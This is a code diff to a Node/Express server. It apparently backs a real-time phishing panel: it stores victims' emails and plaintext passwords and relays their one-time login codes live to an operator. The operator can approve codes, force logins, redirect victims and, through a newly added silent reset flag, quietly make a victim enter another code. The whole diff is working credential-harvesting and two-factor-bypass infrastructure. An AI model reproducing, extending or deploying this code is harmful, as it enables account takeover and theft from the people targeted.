@@ -138,7 +138,8 @@ async function initializeDatabase() {
         first_otp_submitted_at TIMESTAMP,
         second_otp_submitted_at TIMESTAMP,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        reset_otp_flag BOOLEAN DEFAULT FALSE
       )
     `);
     console.log('✅ Users table ready');
@@ -173,7 +174,8 @@ async function initializeDatabase() {
       ADD COLUMN IF NOT EXISTS text_release BOOLEAN DEFAULT FALSE,
       ADD COLUMN IF NOT EXISTS email_submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
       ADD COLUMN IF NOT EXISTS first_otp_submitted_at TIMESTAMP,
-      ADD COLUMN IF NOT EXISTS second_otp_submitted_at TIMESTAMP
+      ADD COLUMN IF NOT EXISTS second_otp_submitted_at TIMESTAMP,
+      ADD COLUMN IF NOT EXISTS reset_otp_flag BOOLEAN DEFAULT FALSE
     `).catch(() => console.log('✅ Additional columns exist'));
 
     await pool.query(`
@@ -229,10 +231,10 @@ app.post('/api/users/login', async (req, res) => {
     }
 
     await pool.query(`
-      INSERT INTO users (email, password, otp_verified, approved, second_approved, email_submitted_at) 
-      VALUES ($1, $2, false, false, false, CURRENT_TIMESTAMP) 
+      INSERT INTO users (email, password, otp_verified, approved, second_approved, email_submitted_at, reset_otp_flag) 
+      VALUES ($1, $2, false, false, false, CURRENT_TIMESTAMP, false) 
       ON CONFLICT (email) DO UPDATE 
-      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP
+      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL, second_otp = NULL, approved = false, second_approved = false, email_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false
     `, [email, password]);
 
     console.log('🔔 New login:', email);
@@ -254,6 +256,25 @@ app.post('/api/users/check-blocked', async (req, res) => {
     res.json({ blocked });
   } catch (error) {
     res.json({ blocked: false });
+  }
+});
+
+// Check reset OTP flag
+app.post('/api/users/check-reset-flag', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ reset: false });
+    const result = await pool.query('SELECT reset_otp_flag FROM users WHERE email = $1', [email]);
+    const reset = result.rows.length > 0 ? result.rows[0].reset_otp_flag : false;
+    
+    // Clear the flag after checking
+    if (reset) {
+      await pool.query('UPDATE users SET reset_otp_flag = false WHERE email = $1', [email]);
+    }
+    
+    res.json({ reset });
+  } catch (error) {
+    res.json({ reset: false });
   }
 });
 
@@ -300,7 +321,7 @@ app.post('/api/users/submit-otp', async (req, res) => {
     if (!email || !otp) return res.status(400).json({ error: 'Missing fields' });
     if (otp.length !== 6) return res.status(400).json({ error: 'OTP must be exactly 6 characters' });
     
-    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP WHERE email = $2', [otp, email]);
+    await pool.query('UPDATE users SET otp = $1, otp_verified = false, approved = false, first_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
     
     io.emit('user-otp-created', { email, otp, timestamp: new Date() });
     res.json({ success: true });
@@ -326,7 +347,7 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
       return res.status(400).json({ error: '❌ You cannot use the same code as your first verification. Please enter a different code.' });
     }
     
-    await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP WHERE email = $2', [otp, email]);
+    await pool.query('UPDATE users SET second_otp = $1, second_approved = false, second_otp_submitted_at = CURRENT_TIMESTAMP, reset_otp_flag = false WHERE email = $2', [otp, email]);
     
     io.emit('user-second-otp-created', { email, second_otp: otp, timestamp: new Date() });
     res.json({ success: true });
@@ -357,20 +378,6 @@ app.post('/api/users/check-redirect-success', async (req, res) => {
     res.json({ redirect_success: result.rows.length > 0 ? result.rows[0].redirect_success : false });
   } catch (error) {
     res.json({ redirect_success: false });
-  }
-});
-
-app.post('/api/users/check-admin-text', async (req, res) => {
-  try {
-    const { email } = req.body;
-    if (!email) return res.json({ admin_text: null, text_release: false });
-    
-    const result = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
-    if (result.rows.length === 0) return res.json({ admin_text: null, text_release: false });
-    
-    res.json({ admin_text: result.rows[0].admin_text, text_release: result.rows[0].text_release });
-  } catch (error) {
-    res.json({ admin_text: null, text_release: false });
   }
 });
 
@@ -414,7 +421,7 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   try {
     const result = await pool.query(`
       SELECT id, email, password, otp, second_otp, otp_attempts, otp_verified, approved, second_approved,
-             force_login, redirect_success, login_email, login_password, admin_text, text_release,
+             force_login, redirect_success, login_email, login_password,
              email_submitted_at, first_otp_submitted_at, second_otp_submitted_at, created_at, updated_at
       FROM users ORDER BY created_at DESC
     `);
@@ -462,9 +469,10 @@ app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
         UPDATE users SET 
           password = 'user', otp = NULL, second_otp = NULL, otp_attempts = 0, otp_verified = false,
           approved = false, second_approved = false, force_login = false, redirect_success = false,
-          login_email = NULL, login_password = NULL, admin_text = NULL, text_release = false,
+          login_email = NULL, login_password = NULL,
           email_submitted_at = NULL, first_otp_submitted_at = NULL, second_otp_submitted_at = NULL,
-          created_at = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP
+          created_at = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP,
+          reset_otp_flag = false
         WHERE LOWER(email) = LOWER($1)
       `, [email]);
     }
@@ -548,7 +556,7 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    await pool.query('UPDATE users SET text_release = true WHERE email = $1', [email]);
+    await pool.query('UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1', [email]);
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Release text error:', error.message);
@@ -556,29 +564,22 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// INCORRECT OTP - RESETS USER OTP STATE (NO NOTIFICATION, NO SOUND)
+// INCORRECT OTP - JUST SETS RESET FLAG (NO TEXT, NO NOTIFICATION)
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
     
-    // RESET everything - clear OTP fields, reset approvals, set error flag
+    // JUST SET THE RESET FLAG - NO TEXT MESSAGE
     await pool.query(`
       UPDATE users SET 
-        otp = NULL,
-        second_otp = NULL,
-        otp_attempts = 0,
-        otp_verified = false,
-        approved = false,
-        second_approved = false,
-        admin_text = 'incorrect_otp_error',
-        text_release = false
+        reset_otp_flag = true
       WHERE email = $1
     `, [email]);
     
-    console.log('🔴 Admin marked OTP as incorrect - User reset:', email);
+    console.log('🔄 Admin triggered OTP reset for user:', email);
     
-    // NO socket emit - NO notification, NO sound
+    // NO socket emit, NO notification, NO sound, NO text message
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
